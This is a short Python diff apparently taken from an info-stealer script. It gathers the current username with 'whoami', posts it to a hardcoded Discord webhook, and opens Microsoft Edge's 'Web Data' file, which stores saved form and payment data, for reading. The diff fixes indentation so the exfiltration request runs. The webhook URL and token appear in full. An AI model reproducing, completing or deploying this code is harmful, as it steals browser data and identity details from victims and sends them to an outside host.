@@ -23,10 +23,10 @@ s= os.popen("whoami").read().strip()
 
 hello = "https://discord.com/api/webhooks/1429030702090948650/wVnXAoK2s1n7dmVc7fHIhstWAjkox-3s9ZYO9GN47bZTYAdSw2s6pqgnGTol15Lzi_CR"
 hey = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data\\Default\\Web Data')
-    see = {
+see = {
         "content": s
     }
-    requests.post(hello,json=see)
+requests.post(hello,json=see)
  
 with open(f'{hey}', 'rb') as file:
     read = file.read()
